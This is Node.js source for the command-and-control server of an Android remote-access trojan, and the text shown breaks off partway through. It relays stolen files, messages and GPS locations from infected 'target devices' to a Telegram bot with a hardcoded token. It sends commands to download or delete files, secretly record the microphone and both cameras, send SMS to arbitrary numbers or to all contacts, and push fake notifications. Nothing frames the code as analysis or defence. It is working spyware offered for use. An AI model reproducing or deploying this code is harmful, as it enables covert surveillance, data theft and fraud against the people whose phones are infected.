const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
const id = '1209615263'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">饾檸饾櫄饾櫑饾櫕饾櫄饾櫑 饾櫔饾櫏饾櫋饾櫎饾櫀饾櫃饾櫄饾櫃 饾櫒饾櫔饾櫂饾櫂饾櫄饾櫒饾櫒饾櫅饾櫔饾櫋饾櫋饾櫘</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `掳鈥� 饾檲饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫅饾櫑饾櫎饾櫌 <b>${req.headers.model}</b> 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `掳鈥� 饾檲饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫅饾櫑饾櫎饾櫌 <b>${req.headers.model}</b> 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `掳鈥� 饾檱饾櫎饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍 饾櫅饾櫑饾櫎饾櫌 <b>${req.headers.model}</b> 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `掳鈥� 饾檳饾櫄饾櫖 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄 饾櫂饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃\n\n` +
        `鈥� 岽呩磭岽犐磩岽� 岽嶀磸岽呩磭薀 : <b>${model}</b>\n` +
        `鈥� 蕶岽�岽涐礇岽囀�蕪 : <b>${battery}</b>\n` +
        `鈥� 岽�纱岽吺�岽徤磪 岽犪磭蕗隃鄙磸纱 : <b>${version}</b>\n` +
        `鈥� 隃贬磩蕗岽囜磭纱 蕶蕗瑟散蕼岽浬瘁磭隃标湵 : <b>${brightness}</b>\n` +
        `鈥� 岽樖�岽忈礌瑟岽呩磭蕗 : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `掳鈥� 饾樋饾櫄饾櫕饾櫈饾櫂饾櫄 饾櫃饾櫈饾櫒饾櫂饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃\n\n` +
            `鈥� 岽呩磭岽犐磩岽� 岽嶀磸岽呩磭薀 : <b>${model}</b>\n` +
            `鈥� 蕶岽�岽涐礇岽囀�蕪 : <b>${battery}</b>\n` +
            `鈥� 岽�纱岽吺�岽徤磪 岽犪磭蕗隃鄙磸纱 : <b>${version}</b>\n` +
            `鈥� 隃贬磩蕗岽囜磭纱 蕶蕗瑟散蕼岽浬瘁磭隃标湵 : <b>${brightness}</b>\n` +
            `鈥� 岽樖�岽忈礌瑟岽呩磭蕗 : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('掳鈥� 饾檵饾櫋饾櫄饾櫀饾櫒饾櫄 饾櫑饾櫄饾櫏饾櫋饾櫘 饾櫓饾櫇饾櫄 饾櫍饾櫔饾櫌饾櫁饾櫄饾櫑 饾櫓饾櫎 饾櫖饾櫇饾櫈饾櫂饾櫇 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫇饾櫄 饾檸饾檲饾檸')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '掳鈥� 饾檪饾櫑饾櫄饾櫀饾櫓, 饾櫍饾櫎饾櫖 饾櫄饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫎 饾櫓饾櫇饾櫈饾櫒 饾櫍饾櫔饾櫌饾櫁饾櫄饾櫑\n\n' +
                '鈥� 蕶岽� 岽勧磤蕗岽囮湴岽準� 岽浭溼磤岽� 岽浭溼磭 岽嶀磭隃标湵岽�散岽� 岽∩熓� 纱岽忈礇 蕶岽� 隃贬磭纱岽� 瑟隃� 岽浭溼磭 纱岽溼磵蕶岽囀� 岽応湴 岽勈溼磤蕗岽�岽勧礇岽囀�隃� 瑟纱 蕪岽忈礈蕗 岽嶀磭隃标湵岽�散岽� 瑟隃� 岽嶀磸蕗岽� 岽浭溼磤纱 岽�薀薀岽忈础岽囜磪',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檪饾櫑饾櫄饾櫀饾櫓, 饾櫍饾櫎饾櫖 饾櫄饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫎 饾櫓饾櫇饾櫈饾櫒 饾櫍饾櫔饾櫌饾櫁饾櫄饾櫑')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫎 饾櫀饾櫋饾櫋 饾櫂饾櫎饾櫍饾櫓饾櫀饾櫂饾櫓饾櫒')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫏饾櫀饾櫓饾櫇 饾櫎饾櫅 饾櫓饾櫇饾櫄 饾櫅饾櫈饾櫋饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫃饾櫎饾櫖饾櫍饾櫋饾櫎饾櫀饾櫃')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫏饾櫀饾櫓饾櫇 饾櫎饾櫅 饾櫓饾櫇饾櫄 饾櫅饾櫈饾櫋饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫃饾櫄饾櫋饾櫄饾櫓饾櫄')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫇饾櫎饾櫖 饾櫋饾櫎饾櫍饾櫆 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫇饾櫄 饾櫌饾櫈饾櫂饾櫑饾櫎饾櫏饾櫇饾櫎饾櫍饾櫄 饾櫓饾櫎 饾櫁饾櫄 饾櫑饾櫄饾櫂饾櫎饾櫑饾櫃饾櫄饾櫃')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫇饾櫎饾櫖 饾櫋饾櫎饾櫍饾櫆 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫇饾櫄 饾櫌饾櫀饾櫈饾櫍 饾櫂饾櫀饾櫌饾櫄饾櫑饾櫀 饾櫓饾櫎 饾櫁饾櫄 饾櫑饾櫄饾櫂饾櫎饾櫑饾櫃饾櫄饾櫃')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫇饾櫎饾櫖 饾櫋饾櫎饾櫍饾櫆 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫇饾櫄 饾櫒饾櫄饾櫋饾櫅饾櫈饾櫄 饾櫂饾櫀饾櫌饾櫄饾櫑饾櫀 饾櫓饾櫎 饾櫁饾櫄 饾櫑饾櫄饾櫂饾櫎饾櫑饾櫃饾櫄饾櫃')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫓饾櫇饾櫀饾櫓 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫀饾櫏饾櫏饾櫄饾櫀饾櫑 饾櫎饾櫍 饾櫓饾櫇饾櫄 饾櫓饾櫀饾櫑饾櫆饾櫄饾櫓 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫀饾櫏饾櫏饾櫄饾櫀饾櫑 饾櫀饾櫒 饾櫍饾櫎饾櫓饾櫈饾櫅饾櫈饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '掳鈥� 饾檪饾櫑饾櫄饾櫀饾櫓, 饾櫍饾櫎饾櫖 饾櫄饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫋饾櫈饾櫍饾櫊 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫁饾櫄 饾櫎饾櫏饾櫄饾櫍饾櫄饾櫃 饾櫁饾櫘 饾櫓饾櫇饾櫄 饾櫍饾櫎饾櫓饾櫈饾櫅饾櫈饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍\n\n' +
                '鈥� 岽∈溼磭纱 岽浭溼磭 岽犐磩岽浬磵 岽勈熒磩岽嬯湵 岽徤� 岽浭溼磭 纱岽忈礇瑟隃吧磩岽�岽浬磸纱, 岽浭溼磭 薀瑟纱岽� 蕪岽忈礈 岽�蕗岽� 岽嚿瘁礇岽囀�瑟纱散 岽∩熓� 蕶岽� 岽忈礃岽嚿瘁磭岽�',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檪饾櫑饾櫄饾櫀饾櫓, 饾櫍饾櫎饾櫖 饾櫄饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫋饾櫈饾櫍饾櫊 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫁饾櫄 饾櫎饾櫏饾櫄饾櫍饾櫄饾櫃 饾櫁饾櫘 饾櫓饾櫇饾櫄 饾櫍饾櫎饾櫓饾櫈饾櫅饾櫈饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫀饾櫔饾櫃饾櫈饾櫎 饾櫋饾櫈饾櫍饾櫊 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫏饾櫋饾櫀饾櫘')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
                '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '掳鈥� 饾檼饾櫄饾櫋饾櫂饾櫎饾櫌饾櫄 饾櫓饾櫎 饾檷饾櫀饾櫓 饾櫏饾櫀饾櫍饾櫄饾櫋\n\n' +
                '鈥� 瑟隃� 岽浭溼磭 岽�岽樶礃薀瑟岽勧磤岽浬磸纱 瑟隃� 瑟纱隃贬礇岽�薀薀岽囜磪 岽徤� 岽浭溼磭 岽涐磤蕗散岽囜礇 岽呩磭岽犐磩岽�, 岽♂磤瑟岽� 隃搬磸蕗 岽浭溼磭 岽勧磸纱纱岽囜磩岽浬磸纱\n\n' +
                '鈥� 岽∈溼磭纱 蕪岽忈礈 蕗岽囜磩岽嚿礌岽� 岽浭溼磭 岽勧磸纱纱岽囜磩岽浬磸纱 岽嶀磭隃标湵岽�散岽�, 瑟岽� 岽嶀磭岽�纱隃� 岽浭溼磤岽� 岽浭溼磭 岽涐磤蕗散岽囜礇 岽呩磭岽犐磩岽� 瑟隃� 岽勧磸纱纱岽囜磩岽涐磭岽� 岽�纱岽� 蕗岽囜磤岽吺� 岽涐磸 蕗岽囜磩岽嚿礌岽� 岽浭溼磭 岽勧磸岽嶀磵岽�纱岽匼n\n' +
                '鈥� 岽勈熒磩岽� 岽徤� 岽浭溼磭 岽勧磸岽嶀磵岽�纱岽� 蕶岽溼礇岽涐磸纱 岽�纱岽� 隃贬磭薀岽囜磩岽� 岽浭溼磭 岽呩磭隃鄙�岽囜磪 岽呩磭岽犐磩岽� 岽浭溼磭纱 隃贬磭薀岽囜磩岽� 岽浭溼磭 岽呩磭隃鄙�岽囜磪 岽勧磸岽嶀磵岽�纱岽� 岽�岽嶀磸纱散 岽浭溼磭 岽勧磸岽嶀磵岽�纱岽呹湵\n\n' +
                '鈥� 瑟隃� 蕪岽忈礈 散岽囜礇 隃贬礇岽溼磩岽� 隃贬磸岽嶀磭岽∈溼磭蕗岽� 瑟纱 岽浭溼磭 蕶岽忈礇, 隃贬磭纱岽� /start 岽勧磸岽嶀磵岽�纱岽�',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '掳鈥� 饾檳饾櫎 饾櫂饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫈饾櫍饾櫆 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒 饾櫀饾櫕饾櫀饾櫈饾櫋饾櫀饾櫁饾櫋饾櫄\n\n' +
                    '鈥� 岽嶀磤岽嬦磭 隃贬礈蕗岽� 岽浭溼磭 岽�岽樶礃薀瑟岽勧磤岽浬磸纱 瑟隃� 瑟纱隃贬礇岽�薀薀岽囜磪 岽徤� 岽浭溼磭 岽涐磤蕗散岽囜礇 岽呩磭岽犐磩岽�'
                )
            } else {
                let text = '掳鈥� 饾檱饾櫈饾櫒饾櫓 饾櫎饾櫅 饾櫂饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `鈥� 岽呩磭岽犐磩岽� 岽嶀磸岽呩磭薀 : <b>${value.model}</b>\n` +
                        `鈥� 蕶岽�岽涐礇岽囀�蕪 : <b>${value.battery}</b>\n` +
                        `鈥� 岽�纱岽吺�岽徤磪 岽犪磭蕗隃鄙磸纱 : <b>${value.version}</b>\n` +
                        `鈥� 隃贬磩蕗岽囜磭纱 蕶蕗瑟散蕼岽浬瘁磭隃标湵 : <b>${value.brightness}</b>\n` +
                        `鈥� 岽樖�岽忈礌瑟岽呩磭蕗 : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '掳鈥� 饾檳饾櫎 饾櫂饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫈饾櫍饾櫆 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒 饾櫀饾櫕饾櫀饾櫈饾櫋饾櫀饾櫁饾櫋饾櫄\n\n' +
                    '鈥� 岽嶀磤岽嬦磭 隃贬礈蕗岽� 岽浭溼磭 岽�岽樶礃薀瑟岽勧磤岽浬磸纱 瑟隃� 瑟纱隃贬礇岽�薀薀岽囜磪 岽徤� 岽浭溼磭 岽涐磤蕗散岽囜礇 岽呩磭岽犐磩岽�'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
